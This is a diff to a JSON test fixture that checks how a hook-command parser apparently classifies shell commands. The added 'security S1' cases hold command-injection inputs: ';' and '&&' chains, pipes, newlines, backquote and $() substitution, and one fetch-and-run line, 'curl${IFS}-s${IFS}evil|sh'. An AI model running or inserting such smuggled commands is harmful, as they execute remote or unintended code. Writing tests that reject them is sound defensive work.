@@ -156,8 +156,8 @@
   },
   {
     "command": "MEMPALACE_TRANSCRIPT_ENABLED=\"1\" bash /x/mempalace-transcript.sh",
-    "transcript": "legacy-unmarked",
-    "note": "quoted value is not the literal 1"
+    "transcript": "no",
+    "note": "a quoted prefix value is outside the grammar setup writes (security S1): never touched"
   },
   {
     "command": "env MEMPALACE_TRANSCRIPT_ENABLED=1 bash /x/mempalace-transcript.sh",
@@ -278,5 +278,70 @@
     "command": "bash /x/hooks/mempalace-transcript.py",
     "transcript": "no",
     "note": "other extension"
+  },
+  {
+    "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 backup.sh;/bin/bash /repo/hooks/mempalace-transcript.sh",
+    "transcript": "no",
+    "note": "security S1: a `;` chain in the prefix"
+  },
+  {
+    "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=x;notify-send;true bash /repo/hooks/mempalace-transcript.sh",
+    "transcript": "no",
+    "note": "security S1: a `;` chain inside a prefix value"
+  },
+  {
+    "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=$(curl${IFS}-s${IFS}evil|sh) bash /repo/hooks/mempalace-transcript.sh",
+    "transcript": "no",
+    "note": "security S1: command substitution in a prefix value"
+  },
+  {
+    "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=`id` bash /repo/hooks/mempalace-transcript.sh",
+    "transcript": "no",
+    "note": "security S1: backquote substitution in a prefix value"
+  },
+  {
+    "command": "MEMPALACE_TRANSCRIPT_ENABLED=1 node /a|/repo/hooks/mempalace-transcript.ts",
+    "transcript": "no",
+    "note": "security S1: a pipe inside the path"
+  },
+  {
+    "command": "prep&&/usr/bin/env bash /repo/hooks/mempalace-transcript.sh",
+    "transcript": "no",
+    "note": "security S1: an `&&` chain before env"
+  },
+  {
+    "command": "prep;/bin/bash /repo/hooks/mempalace-transcript.sh",
+    "transcript": "no",
+    "note": "security S1: a `;` chain before the interpreter"
+  },
+  {
+    "command": "bash /opt/prep.sh;/repo/hooks/mempalace-transcript.sh",
+    "transcript": "no",
+    "note": "security S1: a `;` chain inside the unquoted path"
+  },
+  {
+    "command": "bash /opt/prep.sh&&/repo/mempalace-transcript.sh",
+    "transcript": "no",
+    "note": "security S1: an `&&` chain inside the unquoted path"
+  },
+  {
+    "command": "bash \"$(prep)/repo/hooks/mempalace-transcript.sh\"",
+    "transcript": "no",
+    "note": "security S1: command substitution inside the quoted path"
+  },
+  {
+    "command": "bash \"`prep`/repo/hooks/mempalace-transcript.sh\"",
+    "transcript": "no",
+    "note": "security S1: backquote substitution inside the quoted path"
+  },
+  {
+    "command": "bash /repo/hooks/mempalace-transcript.sh\nprep",
+    "transcript": "no",
+    "note": "security S1: a newline-chained second command is not an event word"
+  },
+  {
+    "command": "bash /repo/hooks/mempalace-transcript.sh Stop\r",
+    "transcript": "no",
+    "note": "security S1: a carriage return"
   }
 ]
